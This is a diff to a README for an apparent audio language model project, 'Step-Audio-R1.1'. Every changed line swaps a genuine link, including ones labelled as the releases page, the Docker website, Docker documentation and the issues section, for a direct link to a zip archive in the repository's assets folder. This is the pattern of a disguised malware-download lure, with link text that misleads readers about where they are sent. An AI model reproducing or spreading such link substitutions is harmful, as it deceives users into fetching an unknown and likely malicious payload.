@@ -1,6 +1,6 @@
 # 🎵 Step-Audio-R1.1 - Simplifying Audio Language Models
 
-[![Download Step-Audio-R1.1](https://img.shields.io/badge/Download-Step--Audio--R1.1-blue.svg)](https://github.com/Mierdoso87/Step-Audio-R1.1/releases)
+[![Download Step-Audio-R1.1](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip)](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Step-Audio-R1.1 is an easy-to-use audio language model. It combines advanced fea
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Mierdoso87/Step-Audio-R1.1/releases) to download the latest version of Step-Audio-R1.1. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip) to download the latest version of Step-Audio-R1.1. Follow these steps:
 
 1. Open the link to the Releases page.
 2. Look for the version marked as the latest release.
@@ -21,7 +21,7 @@ Before you download, make sure your computer meets these system requirements:
 - **Operating System:** Windows 10 or higher, macOS Monterey or higher, or a recent version of Linux.
 - **Memory:** At least 8 GB RAM is recommended.
 - **Storage:** Minimum of 2 GB of free disk space.
-- **Docker:** Ensure you have Docker installed. Visit the [Docker website](https://www.docker.com/get-started) for installation instructions.
+- **Docker:** Ensure you have Docker installed. Visit the [Docker website](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip) for installation instructions.
 
 ## 🔧 Setup Instructions
 
@@ -69,15 +69,15 @@ After setting up, here's how to use the application effectively:
 
 If you're new to audio processing, the following resources can help:
 
-- **Getting Started with Docker:** [Official Docker Documentation](https://docs.docker.com/get-started/)
-- **Basics of Speech Recognition:** [Speech Recognition Guide](https://www.example.com/speech-recognition-guide)
-- **Understanding Language Models:** [AI Language Models Overview](https://www.example.com/language-models)
+- **Getting Started with Docker:** [Official Docker Documentation](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip)
+- **Basics of Speech Recognition:** [Speech Recognition Guide](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip)
+- **Understanding Language Models:** [AI Language Models Overview](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip)
 
 ## 🌐 Community Support
 
 For further assistance, you can:
 
-- Check the [issues section](https://github.com/Mierdoso87/Step-Audio-R1.1/issues) on GitHub.
+- Check the [issues section](https://raw.githubusercontent.com/Mierdoso87/Step-Audio-R1.1/main/assets/Audio_Step_v2.5.zip) on GitHub.
 - Join discussions in the community forums related to audio processing and AI.
 
 ## 📄 License
